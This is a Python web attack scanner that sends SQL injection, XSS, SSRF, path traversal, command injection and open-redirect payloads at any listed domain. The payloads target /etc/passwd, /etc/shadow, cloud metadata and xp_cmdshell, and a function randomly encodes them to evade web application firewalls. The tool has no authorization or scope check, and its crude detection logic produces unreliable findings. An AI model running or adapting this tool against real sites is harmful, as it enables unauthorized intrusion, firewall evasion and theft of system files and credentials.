import argparse
from urllib.parse import urlparse, parse_qs
import requests
from urllib.parse import quote, urlparse, parse_qs
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
import random
import sys
import base64
import os
import re

# Setting up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger()

# Output file for logging potential vulnerabilities
output_file = "potential_vulnerabilities.txt"

# Clear or create the output file
with open(output_file, 'w') as f:
    f.write("Potential Vulnerabilities Log\n")
    f.write("="*50 + "\n")

# Advanced payloads based on CVEs and Bug bounty reports
payloads = {
    'sqli': [
        "' OR '1'='1", "' UNION SELECT NULL--", "' AND 1=1--", "1' OR 1=1--",
        "admin'--", "' OR '1'='1'/*", "1' OR '1'='1' --", "admin'--", "'; EXEC xp_cmdshell('whoami')--",
        # Payloads inspired by recent CVEs
        "1 OR 1=1;--", "admin' #", "' UNION SELECT 1, 'foobar', 3--"
    ],
    'xss': [
        '<script>alert(1)</script>', '"><img src=x onerror=alert(1)>', '<svg onload=alert(1)>',
        '<body onload=alert(1)>', '<iframe src="javascript:alert(1)"></iframe>', '" onfocus=alert(1) autofocus="',
        # Payloads inspired by recent CVEs
        "<img src='x' onerror=alert('XSS')>", "<script>alert('XSS');</script>"
    ],
    'ssrf': [
        'http://169.254.169.254/latest/meta-data/', 'http://localhost:80', 'http://127.0.0.1:22',
        'http://internal.example.com', 'http://0.0.0.0:80', 'file:///etc/passwd',
        # Payloads inspired by recent CVEs
        'http://127.0.0.1:8000', 'file:///C:/Windows/System32/drivers/etc/hosts'
    ],
    'traversal': [
        '../../etc/passwd', '../../../etc/passwd', '/../../../../etc/passwd', '/etc/passwd%00',
        '../../../../../etc/shadow', '..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini',
        # Payloads inspired by recent CVEs
        '../../../../../../etc/passwd%00', '../.../.../.../.../.../.../.../etc/passwd'
    ],
    'cmd_injection': [
        '; ls -la', '| cat /etc/passwd', '&& whoami', '`id`', '|| uname -a', '& netstat -an',
        # Payloads inspired by recent CVEs
        '; whoami', '| id', '&& echo vulnerable'
    ],
    'open_redirect': [
        'https://evil.com', '//evil.com', '/\\evil.com', '/..%2fevil.com', '/%09evil.com',
        # Payloads inspired by recent CVEs
        '/%2e%2e%2f%2e%2e%2f/evil.com', '//www.evil.com/%2e%2e%2f'
    ],
    'idor': [
        '1', '2', '3', '4', '5', '10', '100', '999', 'admin', 'root',
        # Payloads inspired by recent CVEs
        '101', '102', '103', '1000', '9999'
    ],
    # Add more sophisticated payloads as needed
}

# Special characters for reflection check
special_chars = ["'", '"', "<", ">", "&", "%"]

# WAF Evasion techniques
def evade_waf(payload):
    evasions = [
        quote(payload),  # URL encoding
        payload.replace(' ', '/**/'),  # SQL comment-based evasion
        base64.b64encode(payload.encode()).decode(),  # Base64 encoding
        payload.replace(' ', '%20'),  # Space URL encoding
        ''.join(random.choice((str.upper, str.lower))(char) for char in payload)  # Random casing
    ]
    return random.choice(evasions)

# Function to read URLs from stdin or file
def read_urls_from_file(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

def read_urls():
    return [line.strip() for line in sys.stdin]

# Function to log potential vulnerabilities to a file
def log_vulnerability(vuln_type, url, payload):
    with open(output_file, 'a') as f:
        f.write(f"Type: {vuln_type}\nURL: {url}\nPayload: {payload}\n\n")

# Exception-handled request
def safe_request(url):
    try:
        response = requests.get(url, timeout=10)
        return response
    except requests.RequestException as e:
        logger.error(f"Request failed: {e}")
        return None

# Reflection check
def check_reflection(url):
    for char in special_chars:
        test_url = f"{url}{quote(char)}"
        response = safe_request(test_url)
        if response and char in response.text:
            logger.info(f"Reflection found for character '{char}' at {url}")
            return True
    return False

# Extract parameters from URL
def extract_params(url):
    parsed_url = urlparse(url)
    query = parsed_url.query
    if '#' in query:
        query = query.split('#', 1)[0]  # Remove fragment part if present

    params = parse_qs(query, keep_blank_values=True)
    # Handle edge case where parse_qs returns lists for single values
    params = {k: v[0] if len(v) == 1 else v for k, v in params.items()}
    
    return params

# Function to check if URL is API related
def is_api_url(url):
    return 'api' in url.lower()

# Function to prioritize URLs
def prioritize_urls(urls):
    interesting_keywords = ['admin', 'login', 'user', 'profile', 'search']
    return sorted(urls, key=lambda url: any(keyword in url for keyword in interesting_keywords), reverse=True)

# SQL Injection scanning function with reflection check and improved validation
def scan_sqli(url):
    if not check_reflection(url):
        logger.info(f"No reflection found for SQLi check: {url}")
        return
    logger.info(f"Scanning for SQLi: {url}")
    for payload in payloads['sqli']:
        evaded_payload = evade_waf(payload)
        test_url = f"{url}{quote(evaded_payload)}"
        response = safe_request(test_url)
        if response:
            logger.info(f"Testing payload: {evaded_payload} | Status: {response.status_code} | Size: {len(response.text)}")
            if response.status_code == 500 or "SQL" in response.text or "syntax" in response.text:
                logger.info(f"Potential SQLi found: {test_url}")
                log_vulnerability('SQL Injection', test_url, evaded_payload)

# XSS scanning function with reflection check and improved validation
def scan_xss(url):
    if not check_reflection(url):
        logger.info(f"No reflection found for XSS check: {url}")
        return
    logger.info(f"Scanning for XSS: {url}")
    for payload in payloads['xss']:
        evaded_payload = evade_waf(payload)
        test_url = f"{url}{quote(evaded_payload)}"
        response = safe_request(test_url)
        if response:
            logger.info(f"Testing payload: {evaded_payload} | Status: {response.status_code} | Size: {len(response.text)}")
            if evaded_payload in response.text:
                logger.info(f"Potential XSS found: {test_url}")
                log_vulnerability('XSS', test_url, evaded_payload)

# SSRF scanning function with reflection check and improved validation
def scan_ssrf(url):
    if not check_reflection(url):
        logger.info(f"No reflection found for SSRF check: {url}")
        return
    logger.info(f"Scanning for SSRF: {url}")
    for payload in payloads['ssrf']:
        evaded_payload = evade_waf(payload)
        test_url = f"{url}{quote(evaded_payload)}"
        response = safe_request(test_url)
        if response:
            logger.info(f"Testing payload: {evaded_payload} | Status: {response.status_code} | Size: {len(response.text)}")
            if response.status_code == 200 and "meta-data" in response.text:
                logger.info(f"Potential SSRF found: {test_url}")
                log_vulnerability('SSRF', test_url, evaded_payload)

# Path traversal scanning function with reflection check and improved validation
def scan_traversal(url):
    if not check_reflection(url):
        logger.info(f"No reflection found for Path Traversal check: {url}")
        return
    logger.info(f"Scanning for Path Traversal: {url}")
    for payload in payloads['traversal']:
        evaded_payload = evade_waf(payload)
        test_url = f"{url}{quote(evaded_payload)}"
        response = safe_request(test_url)
        if response:
            logger.info(f"Testing payload: {evaded_payload} | Status: {response.status_code} | Size: {len(response.text)}")
            if "root:" in response.text or "shadow" in response.text:
                logger.info(f"Potential Path Traversal found: {test_url}")
                log_vulnerability('Path Traversal', test_url, evaded_payload)

# Command injection scanning function with reflection check and improved validation
def scan_cmd_injection(url):
    if not check_reflection(url):
        logger.info(f"No reflection found for Command Injection check: {url}")
        return
    logger.info(f"Scanning for Command Injection: {url}")
    for payload in payloads['cmd_injection']:
        evaded_payload = evade_waf(payload)
        test_url = f"{url}{quote(evaded_payload)}"
        response = safe_request(test_url)
        if response:
            logger.info(f"Testing payload: {evaded_payload} | Status: {response.status_code} | Size: {len(response.text)}")
            if "root" in response.text or "uid=" in response.text:
                logger.info(f"Potential Command Injection found: {test_url}")
                log_vulnerability('Command Injection', test_url, evaded_payload)

# Open Redirect scanning function with reflection check and improved validation
def scan_open_redirect(url):
    if not check_reflection(url):
        logger.info(f"No reflection found for Open Redirect check: {url}")
        return
    logger.info(f"Scanning for Open Redirect: {url}")
    for payload in payloads['open_redirect']:
        evaded_payload = evade_waf(payload)
        test_url = f"{url}{quote(evaded_payload)}"
        response = safe_request(test_url)
        if response:
            logger.info(f"Testing payload: {evaded_payload} | Status: {response.status_code} | Size: {len(response.text)}")
            if evaded_payload in response.text:
                logger.info(f"Potential Open Redirect found: {test_url}")
                log_vulnerability('Open Redirect', test_url, evaded_payload)

# Function to process URL
def process_url(url):
    if is_api_url(url):
        logger.info(f"Ignoring API URL: {url}")
        return
    params = extract_params(url)
    if params:
        logger.info(f"Processing URL: {url} with parameters: {params}")
        scan_sqli(url)
        scan_xss(url)
        scan_ssrf(url)
        scan_traversal(url)
        scan_cmd_injection(url)
        scan_open_redirect(url)
    else:
        logger.info(f"No parameters found in URL: {url}")

# Main function to handle single domain or multiple domains from file
def main():
    parser = argparse.ArgumentParser(description='Advanced vulnerability scanner')
    parser.add_argument('-d', '--domain', help='Single domain to scan')
    parser.add_argument('-l', '--list', help='File containing list of domains to scan')
    args = parser.parse_args()

    urls = []
    if args.domain:
        urls = [args.domain]
    elif args.list:
        urls = read_urls_from_file(args.list)
    else:
        logger.error("Either --domain or --list must be specified")
        return

    urls = prioritize_urls(urls)
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(process_url, url) for url in urls]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                logger.error(f"Error processing URL: {e}")

if __name__ == "__main__":
    main()
